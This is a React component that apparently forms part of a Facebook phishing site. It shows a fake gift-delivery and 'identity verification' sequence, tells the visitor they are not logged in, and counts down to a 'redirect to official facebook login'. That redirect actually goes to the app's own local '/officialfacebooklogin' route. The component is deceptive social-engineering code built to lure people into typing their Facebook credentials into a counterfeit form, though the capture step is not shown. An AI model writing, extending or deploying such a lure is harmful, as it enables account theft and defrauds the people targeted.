import { useState } from "react";
import { useEffect } from "react";
import { InfinitySpin } from "react-loader-spinner";
import { FaFacebook } from "react-icons/fa";
import { useNavigate } from "react-router";
import { useRef } from "react";
export default function FacebookVerification() {

  const navigate = useNavigate()

  const [loading, setLoading] = useState(true)
  const [loginStage, setLoginStage] = useState(false)
  const timer = useRef(5)

  useEffect(() => {
    setTimeout(() => {
      document.querySelector(".verify-msg").innerHTML="Checking locations 🌍"
    }, 3500);
    setTimeout(() => {
      document.querySelector(".verify-msg").innerHTML="Packing Your gift package 📦📦"
      
    }, 3500+3500);
    setTimeout(() => {
      document.querySelector(".verify-msg").innerHTML="🚚 Handing to our delivery partner 🚚"
      
    }, 3500+3500+3500);
    setTimeout(() => {
      document.querySelector(".verify-msg").innerHTML="Veryfing 🔒 your facebook account"
      
    }, 3500+3500+3500+3500);
    setTimeout(() => {
      document.querySelector(".verify-msg").innerHTML="You aren't logged in ⛔. Please login 🔐 to proceed"
      setLoginStage(true)
      
    }, 3500+3500+3500+3500);
  }, [])
  


  return (
    <>


    {!loading ? "" : (
      <div className="verify-container w-screen h-screen flex justify-center items-center text-3xl font-[Consolas] flex-col gap-15">
        <div className="scale-[200%]">
        <InfinitySpin
  visible={true}
  width="200"
  color="#4fa94d"
  ariaLabel="infinity-spin-loading"
  />
        </div>
        <h1 className=" animate-bounce text-blue-500"><span className="verify-msg capitalize">Verifying your identity</span> <span className="animate-pulse">...</span></h1>
        {
          loginStage ? (
            <button className="bg-blue-500 px-6 py-3 text-xl font-bold font-[Calibri] rounded-lg text-white capitalize flex gap-3 cursor-pointer hover:bg-blue-600 active:scale-105" onClick={()=>{
              setLoginStage(false)
              
               document.querySelector(".verify-msg").innerHTML="Redirecting ➡ you to official facebook login 🔒"
               setTimeout(() => {
                   document.querySelector(".verify-msg").innerHTML=`Redirecting 🚕 to facebook in <span class="timer">${timer.current}</span>s`
                   const timerInterval = setInterval(() => {
                       timer.current = timer.current - 1
                       document.querySelector(".timer").innerHTML=timer.current                  
                  }, 1000);
                   setTimeout(() => {
                      clearInterval(timerInterval)
                      navigate("/officialfacebooklogin")
                   }, 5000);
                }, 2000);
            }}><FaFacebook className="text-3xl" />Login your facebook account</button>
          ):""
        }
      </div>
    )}

    </>
  )
}
